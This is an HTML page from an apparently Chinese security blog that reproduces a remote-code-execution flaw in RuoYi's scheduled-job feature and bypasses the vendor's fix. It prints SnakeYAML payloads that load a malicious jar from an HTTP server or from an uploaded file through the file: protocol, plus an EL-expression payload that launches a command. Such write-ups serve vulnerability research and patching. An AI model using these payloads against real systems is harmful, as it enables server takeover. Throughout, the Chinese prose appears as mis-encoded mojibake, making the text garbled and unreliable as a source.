<!DOCTYPE html>
<html  lang="zh">
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 3.8.0" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡ - P1ay2win&#39;s blog</title>
<meta name="twitter:card" content="summary_large_image">
<meta property="og:site_name" content="P1ay2win's blog">
<meta property="og:type" content="website">
<meta property="og:title" content="è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡ | P1ay2win's blog">
<meta property="og:image" content="http://127.0.0.1/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/">
<meta property="twitter:image" content="http://127.0.0.1/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/">






<link rel="alternative" href="/atom.xml" title="è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡" type="application/atom+xml">



<link rel="icon" href="/images/header.png">


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/back-to-top.css">

    
    
    
    
    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    
    


<link rel="stylesheet" href="/css/style.css">

</head>
<body class="is-3-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <img src="/images/header.png" alt="è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡" height="28">
                P1ay2win&#39;s blog
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item"
                href="/">ä¸»é¡µ</a>
                
                <a class="navbar-item"
                href="/archives">å½’æ¡£</a>
                
                <a class="navbar-item"
                href="/categories">åˆ†ç±»</a>
                
                <a class="navbar-item"
                href="/tags">æ ‡ç­¾</a>
                
            </div>
            
            <div class="navbar-end">
                
                    
                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                    
                
                
                <a class="navbar-item is-hidden-tablet catalogue" title="ç›®å½•" href="javascript:;">
                    <i class="fas fa-list-ul"></i>
                </a>
                
                
                <a class="navbar-item search" title="æœç´¢" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
            </div>
        </div>
    </div>
</nav>

    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2021-09-04T09:11:53.000Z">2021-09-04</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/ä»£ç å®¡è®¡/">ä»£ç å®¡è®¡</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    16 åˆ†é’Ÿ è¯»å®Œ (å¤§çº¦ 2468 ä¸ªå­—)
                </span>
                
                
                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>æ¬¡é˜…è¯»
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡
            
        </h1>
        <div class="content">
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦å®Œäº†Javaååºåˆ—åŒ–ï¼Œåœ¨CNVDä¸Šæ‰¾äº†ä¸ªæœ‰Javaååºåˆ—åŒ–æ¼æ´çš„ç³»ç»Ÿç»ƒç»ƒæ‰‹ï¼Œå«è‹¥ä¾åå°ç®¡ç†ç³»ç»Ÿï¼Œåœ¨githubä¸Šçš„staræ•°ä¹Ÿä¸å°‘ã€‚æˆ‘æ˜¯æŒºå–œæ¬¢è¿™ä¸ªåå­—çš„ï¼Œ<strong>ä½ è‹¥ä¸ç¦»ä¸å¼ƒã€æˆ‘å¿…ç”Ÿæ­»ç›¸ä¾</strong>ï¼Œè¿™ä¸ªå¯“æ„å¯æ˜¯ä½œè€…çš„å®˜æ–¹è§£è¯»ï¼Œä¸æ˜¯æˆ‘çç¼–çš„ã€‚ğŸ˜†</p>
<a id="more"></a>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä¸»è¦æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä»£ç å®¡è®¡çš„æ–‡ç« ï¼Œæœäº†ä¸‹å‘ç°æœ‰ä¸€ç¯‡ç®€å•å®¡è®¡è¿™ä¸ªååºåˆ—åŒ–æ¼æ´çš„æ–‡ç« ï¼Œåœ¨å®˜ç½‘ä¸Šè¿˜ååˆ†è‰¯å¿ƒçš„ç»™å‡ºäº†å†å²æ¼æ´ã€‚åœ¨å†å²æ¼æ´é‡Œç»™å‡ºäº†Pocå’Œä¿®å¤æ–¹æ¡ˆã€‚</p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-08-29 091602.png" alt></p>
<p>å¯ä»¥åˆæ­¥å¾—çŸ¥æ¼æ´å‡ºç°åœ¨å®šæ—¶ä»»åŠ¡çš„<code>SysJobController</code>æ§åˆ¶å™¨é‡Œï¼Œä¸‰ä¸ªPOCçš„å‰ä¸¤ä¸ªæ˜¯JNDIæ³¨å…¥ï¼Œåä¸€ä¸ªæ˜¯yamlååºåˆ—åŒ–ã€‚</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´å¤ç°è¿™é‡Œä½¿ç”¨yamlååºåˆ—åŒ–çš„payloadæ¥å¤ç°ã€‚åœ¨githubä¸Šä¸‹è½½<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">yaml-payload</a>å¹¶ç¼–è¯‘æ‰“åŒ…æˆjaråŒ…ï¼Œå¹¶ä½¿ç”¨pythonçš„<code>SimpleHTTPServer</code>æ¨¡å—èµ·ä¸€ä¸ªHTTPæœåŠ¡ç”¨æ¥ä¸‹è½½æ¶æ„jaråŒ…ã€‚ç„¶åï¼Œåœ¨åå°ç³»ç»Ÿç›‘æ§çš„å®šæ—¶ä»»åŠ¡é‡ŒåŠ ä¸Šä»¥ä¸‹ä¸€æ¡ä»»åŠ¡ã€‚</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;)</span><br></pre></td></tr></table></figure>
<p>ç„¶åï¼ŒIDEAé‡Œåœ¨<code>Runtime</code>çš„<code>exec</code>æ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹ï¼Œå¹¶åœ¨ç›¸åº”å®šæ—¶ä»»åŠ¡çš„æ›´å¤šæ“ä½œé‡Œæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ã€‚åœ¨è°ƒç”¨æ ˆé‡Œå¯çœ‹åˆ°ï¼Œé¡¹ç›®é‡Œçš„æ–¹æ³•è°ƒç”¨æœ‰å››ä¸ªï¼Œå…¶ä»–ä¸¤å—çš„è°ƒç”¨æ ˆåˆ†åˆ«æ˜¯quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶å’Œsnakeyamlçš„æ ˆã€‚</p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-08-31 143701.png" alt></p>
<p>è·Ÿè¿›<code>AbstractQuartzJob</code>çš„<code>execute</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”±quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶è°ƒç”¨çš„ï¼Œç”±quartzçš„æ–‡æ¡£å¯çŸ¥æ¯ä¸ªå®ç°<code>Job</code>æ¥å£çš„ç±»ä¸ºä¸€ä¸ªä»»åŠ¡ï¼Œè¿™ä¸ªç±»è¿˜éœ€é‡å†™<code>execute</code>æ–¹æ³•æ¥å®ç°ä»»åŠ¡çš„æ‰§è¡Œå†…å®¹ã€‚åœ¨è¿™ä¸ª<code>execute</code>æ–¹æ³•é‡Œï¼Œå®ƒå®ä¾‹åŒ–äº†ä¸€ä¸ª<code>SysJob</code>ç±»ï¼Œå¹¶è°ƒç”¨äº†<code>doExecute</code>æ–¹æ³•ã€‚è°ƒç”¨çš„<code>doExecute</code>æ–¹æ³•æ˜¯å­ç±»<code>QuartzDisallowConcurrentExecution</code>ï¼ŒåŠŸèƒ½åªæ˜¯å†ç»§ç»­è°ƒç”¨<code>JobInvokeUtil</code>çš„<code>invokeMethod</code>é™æ€æ–¹æ³•ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›åˆ°<code>invokeMethod</code>æ–¹æ³•ï¼Œæ‰æœ‰ä¸€äº›å®è´¨æ€§çš„é€»è¾‘ä»£ç ã€‚å¼€å¤´è°ƒç”¨ç›®æ ‡ã€ç±»åã€æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ã€‚</p>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    String invokeTarget = sysJob.getInvokeTarget();</span><br><span class="line">    String beanName = getBeanName(invokeTarget);</span><br><span class="line">    String methodName = getMethodName(invokeTarget);</span><br><span class="line">    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))</span><br><span class="line">    &#123;</span><br><span class="line">        Object bean = SpringUtils.getBean(beanName);</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Object bean = Class.forName(beanName).newInstance();</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>éœ€è¦æ³¨æ„çš„æ˜¯è·å–æ–¹æ³•å‚æ•°è¿™é‡Œï¼Œ<strong>åªèƒ½è·å–<code>String</code>ã€<code>boolen</code>ã€<code>long</code>ã€<code>double</code>å’Œ<code>int</code>ç±»å‹çš„å‚æ•°</strong>ã€‚</p>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)</span><br><span class="line">&#123;</span><br><span class="line">    String methodStr = StringUtils.substringBetween(invokeTarget, <span class="hljs-string">"("</span>, <span class="hljs-string">")"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] methodParams = methodStr.split(<span class="hljs-string">","</span>);</span><br><span class="line">    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        String str = StringUtils.trimToEmpty(methodParams[i]);</span><br><span class="line">        <span class="hljs-comment">// Stringå­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«'</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (StringUtils.contains(str, <span class="hljs-string">"'"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            classs.add(<span class="hljs-keyword">new</span> Object[] &#123; StringUtils.replace(str, <span class="hljs-string">"'"</span>, <span class="hljs-string">""</span>), String.class &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// booleanå¸ƒå°”ç±»å‹ï¼Œç­‰äºtrueæˆ–è€…false</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(str, <span class="hljs-string">"true"</span>) || StringUtils.equalsIgnoreCase(str, <span class="hljs-string">"false"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// longé•¿æ•´å½¢ï¼ŒåŒ…å«L</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">"L"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// doubleæµ®ç‚¹ç±»å‹ï¼ŒåŒ…å«D</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">"D"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// å…¶ä»–ç±»å‹å½’ç±»ä¸ºæ•´å½¢</span></span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> classs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åç»­æ­£å¸¸ç±»åä¼šè¿›å…¥<code>else</code>ä»£ç ä½“ï¼Œé€šè¿‡<code>newInstance</code>æ–¹æ³•è·å¾—ä¼ å…¥ç±»åçš„<strong>æ— å‚æ„é€ æ–¹æ³•å®ä¾‹åŒ–çš„å¯¹è±¡</strong>ï¼Œç„¶åä½¿ç”¨å¯¹è±¡ã€æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°è°ƒç”¨å¦ä¸€ä¸ªé‡è½½çš„<code>invokeMethod</code>æ–¹æ³•ã€‚è¿™ä¸ªé‡è½½çš„<code>invokeMethod</code>æ–¹æ³•å°±æ˜¯å®ç°åå°„è°ƒç”¨æ–¹æ³•çš„åŠŸèƒ½ï¼Œè¿™é‡Œå°±æ˜¯ä¸ç»†è¯´äº†ã€‚è‡³äºPOCä¸­JNDIæ³¨å…¥ï¼Œä¸Šä¸€ç¯‡æ–‡ç« æœ‰åˆ†æï¼Œè¿™é‡Œä¹Ÿä¸ç»†è¯´äº†ï¼Œè€Œyamlæ€ä¹ˆå®ç°çš„ååºåˆ—åŒ–ï¼Œæœ¬æ–‡ä¹Ÿä¸å±•å¼€ï¼Œåœ¨åç»­çš„æ–‡ç« ä¸­å†ä»”ç»†åˆ†æã€‚</p>
<p>é€šè¿‡ä»¥ä¸Šçš„è°ƒç”¨æ ˆçš„åˆ†æï¼Œå¯å¾—å‡ºä»¥ä¸‹æ„é€ è‹¥ä¾ååºåˆ—åŒ–æ¼æ´payloadçš„æ¡ä»¶ï¼š</p>
<ul>
<li>å…¥å£ç±»åªå¯è¿›è¡Œä¸€æ¬¡åå°„è°ƒç”¨</li>
<li>å…¥å£ç±»éœ€å¯è¢«å®ä¾‹åŒ–ï¼Œå¹¶å…·æœ‰é»˜è®¤çš„æ— å‚æ„é€ æ–¹æ³•</li>
<li>è°ƒç”¨çš„ç±»æ–¹æ³•éœ€ä¸ºæ— å‚æˆ–å‚æ•°ä¸º<code>String</code>ã€<code>boolen</code>ã€<code>long</code>ã€<code>double</code>å’Œ<code>int</code>å‡ ç§ç±»å‹</li>
</ul>
<h2 id="è¿‡æ»¤ä¸ä¸¥"><a href="#è¿‡æ»¤ä¸ä¸¥" class="headerlink" title="è¿‡æ»¤ä¸ä¸¥"></a>è¿‡æ»¤ä¸ä¸¥</h2><p>å›åˆ°å®˜ç½‘ï¼Œä½œè€…ç»™å‡ºçš„ä¿®å¤æ–¹æ¡ˆæ˜¯è¿‡æ»¤<code>rmi</code>ã€<code>ldap</code>ã€<code>http</code>å­—ç¬¦ä¸²ï¼Œå¯¹åº”çš„æ˜¯ä½œè€…ç»™å‡ºçš„ä¸‰ä¸ªPOCã€‚é‚£è¿˜æœ‰å…¶ä»–åè®®å¯ä»¥å®ç°ååºåˆ—åŒ–å—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œ è™½ç„¶å®˜æ–¹æ–‡æ¡£å¥½åƒæ²¡æœ‰ç»™å‡º<code>URL</code>ç±»æ”¯æŒçš„åè®®ï¼Œä½†å¯ä»¥ä½¿ç”¨ä»¥ä¸‹éªŒè¯æ”¯æŒé‚£ç§åè®®ã€‚</p>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String host = <span class="hljs-string">"www.baidu.com"</span>;</span><br><span class="line">    String file = <span class="hljs-string">"/index.html"</span>;</span><br><span class="line"></span><br><span class="line">    String[] schames = &#123;<span class="hljs-string">"http"</span>, <span class="hljs-string">"https"</span>, <span class="hljs-string">"ftp"</span>, <span class="hljs-string">"mailto"</span>, <span class="hljs-string">"telnet"</span>, <span class="hljs-string">"file"</span>, <span class="hljs-string">"ldap"</span>, <span class="hljs-string">"gopher"</span>,</span><br><span class="line">            <span class="hljs-string">"jdbc"</span>, <span class="hljs-string">"rmi"</span>, <span class="hljs-string">"jndi"</span>, <span class="hljs-string">"jar"</span>, <span class="hljs-string">"doc"</span>, <span class="hljs-string">"netdoc"</span>, <span class="hljs-string">"nfs"</span>, <span class="hljs-string">"verbatim"</span>, <span class="hljs-string">"finger"</span>, <span class="hljs-string">"daytime"</span>,</span><br><span class="line">            <span class="hljs-string">"systemresource"</span>, <span class="hljs-string">"webService"</span>, <span class="hljs-string">"redis"</span>, <span class="hljs-string">"zookeeper"</span>, <span class="hljs-string">"rest"</span>, <span class="hljs-string">"thrift"</span>, <span class="hljs-string">"dubbo"</span>&#125;;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; schames.length; i++) &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            URL url = <span class="hljs-keyword">new</span> URL(schames[i], host, file);</span><br><span class="line">            System.out.println(<span class="hljs-string">"æ»‹ç“· "</span> + schames[i] + <span class="hljs-string">" åè®®"</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="hljs-string">"ä¸æ»‹ç“· "</span> + schames[i] + <span class="hljs-string">" åè®®"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-08-31 232835.png" alt></p>
<p>åœ¨æµ‹è¯•ç»“æœä¸­ä¸€çœ¼å°±èƒ½çœ‹åˆ°<code>file</code>åè®®å’Œ<code>ftp</code>åè®®ï¼Œè¿˜æœ‰ä¸ª<code>jar</code>åè®®ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦å€ŸåŠ©å…¶ä»–åè®®æ‰èƒ½ä¸‹è½½<code>jar</code>åŒ…ï¼Œå°±æ²¡å¿…è¦å¤šæ­¤ä¸€ä¸¾äº†ã€‚</p>
<p><code>ftp</code>åè®®çš„æ¼æ´åˆ©ç”¨å’Œ<code>http</code>åè®®çš„å…¶å®å·®ä¸å¤šï¼ŒæŠŠPOCä¸­çš„åè®®æ”¹ä¸€æ”¹ï¼ŒftpæœåŠ¡å¯ä»¥ä½¿ç”¨pythonçš„<code>pyftpdlib</code>æ¨¡å—æ­ä¸€ä¸ªã€‚</p>
<p><code>file</code>åè®®çš„åˆ©ç”¨éœ€è¦æŠŠjaråŒ…ä¸Šä¼ åˆ°ç½‘ç«™ä¸Šï¼Œé€šçŸ¥å…¬å‘Šæ¨¡å—çš„ç¼–è¾‘å™¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè™½ç„¶æœ‰æ–‡ä»¶åç¼€çš„ç™½åå•è¿‡æ»¤ï¼Œä½†å¹¶ä¸å½±å“<code>URL</code>ç±»åŠ è½½jaråŒ…ã€‚ä¸è¿‡ä¸Šä¼ æ–‡ä»¶è¿”å›çš„è·¯å¾„å¹¶ä¸æ˜¯ç½‘ç«™ä¸Šç‰©ç†è·¯å¾„ï¼Œåœ¨springçš„é…ç½®æ–‡ä»¶<code>application.yml</code>ä¸­å¯ä»¥çœ‹åˆ°windowsçš„é»˜è®¤è·¯å¾„ä¸º<code>D:/ruoyi/uploadPath</code>ï¼Œlinuxçš„é»˜è®¤è·¯å¾„ä¸º<code>/home/ruoyi/uploadPath</code>ã€‚</p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-09-03 163337.png" alt></p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-09-03 163545.png" alt></p>
<p>æ‰€ä»¥ç‰©ç†è·¯å¾„æ˜¯<code>D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt</code>ï¼Œæœ€åçš„payloadå¦‚ä¸‹ã€‚</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="ä¸€äº›å…¶ä»–å°è¯•"><a href="#ä¸€äº›å…¶ä»–å°è¯•" class="headerlink" title="ä¸€äº›å…¶ä»–å°è¯•"></a>ä¸€äº›å…¶ä»–å°è¯•</h2><p>é™¤äº†è¿‡æ»¤ä¸ä¸¥ï¼Œè¿˜æƒ³åˆ°äº†ä¸¤ç§æ„é€ payloadçš„æ–¹æ³•ï¼Œåˆ†åˆ«ä¸ºä»ä¾èµ–åŒ…å’Œé¡¹ç›®ä¸­å¯»æ‰¾åˆé€‚çš„ç±»å’Œæ–¹æ³•ã€‚ç”±äºç³»ç»Ÿæ¡†æ¶æ˜¯Springçš„ï¼Œä¸€å¼€å§‹æƒ³åˆ°çš„æ˜¯ç”¨SpELè¡¨è¾¾å¼æ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯åé¢è¯•äº†ä¸‹æ‰çŸ¥é“<code>parseExpression</code>æ–¹æ³•ç”Ÿæˆè¡¨è¾¾å¼å¯¹è±¡åï¼Œè¿™ä¸ªå¯¹è±¡è¿˜å¾—è°ƒç”¨<code>getValue</code>æ–¹æ³•æ‰ä¼šè§£æè¿™ä¸ªè¡¨è¾¾å¼ã€‚åé¢é™†é™†ç»­ç»­çœ‹äº†äº›è´¨æ–™ï¼Œå‘ç°ELè¡¨è¾¾å¼ä¼¼ä¹ç¬¦åˆè¿™ä¸ªç³»ç»Ÿçš„åœºæ™¯ã€‚ç®€å•çš„ä»‹ç»ä¸‹ELè¡¨è¾¾å¼ï¼Œä»–æ˜¯ä¸€ç§å¯åœ¨JSPå’ŒJSPXä¸­ä½¿ç”¨çš„è¯­è¨€ï¼Œå¯åœ¨è„šæœ¬ä¸­è·å–å‚æ•°ã€æ‰§è¡Œè¿ç®—ã€è·å–å¯¹è±¡å’Œè°ƒç”¨å‡½æ•°ç­‰ã€‚</p>
<p>åœ¨Javaä»£ç ä¸­å¯ä»¥ä½¿ç”¨<code>ELProcessor</code>å¯¹è±¡çš„<code>eval</code>è§£æELè¡¨è¾¾å¼ï¼Œç»è¿‡ç®€å•æ„é€ å¯å¾—å‡ºpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\&apos;(java.lang.String[])\&apos;]([\&apos;cmd\&apos;,\&apos;/c\&apos;,\&apos;calc\&apos;]).start()&quot;)&apos;)</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œä¸€è·‘èµ·æ¥å°±æŠ›å‡ºäº†<code>ELException</code>å¼‚å¸¸ï¼Œè°ƒè¯•è·Ÿåˆ°åå°„è°ƒç”¨çš„åœ°æ–¹å‘ç°ELè¡¨è¾¾å¼åªå‰©ä¸‹<code>&quot;&quot;.getClass(</code>ã€‚</p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-09-04 171330.png" alt></p>
<p>æœ€åå›å»æ‰¾ï¼Œå¤§æ„äº†ã€‚åœ¨<code>StringUtils</code>å·¥å…·ç±»çš„<code>substringBetween</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä»–è·å–å‚æ•°çš„æ–¹æ³•ä¸­å‘ç°å®ƒåŒ¹é…çš„å³æ‹¬å·æ˜¯ä¼ å…¥payloadä¸­çš„ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯payloadä¸­è°ƒç”¨çš„æ–¹æ³•ä¸èƒ½å‡ºç°å·¦æ‹¬å·ï¼Œå¦åˆ™æ— æ³•è·å–åˆ°æ‰€æœ‰çš„å‚æ•°ã€‚</p>
<p><img src="/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/å±å¹•æˆªå›¾ 2021-09-04 172942.png" alt></p>
